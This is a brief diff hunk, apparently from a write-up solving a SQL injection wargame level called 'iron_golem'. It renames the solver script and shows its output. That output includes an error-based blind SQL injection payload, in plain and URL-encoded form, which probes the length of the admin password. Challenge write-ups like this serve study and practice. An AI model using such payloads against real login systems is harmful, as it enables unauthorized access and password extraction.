@@ -147,7 +147,7 @@ print(f"[!] Final payload: ?pw={password}")
 ```
 
 ```
-$ python .\losqli.py
+$ python .\iron_golem_script.py
 
 [!] Payload: ?pw=' or id='admin' and if(length(pw)=32, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
 [!] Payload (URL encoded): ?pw=%27+or+id%3D%27admin%27+and+if%28length%28pw%29%3D32%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
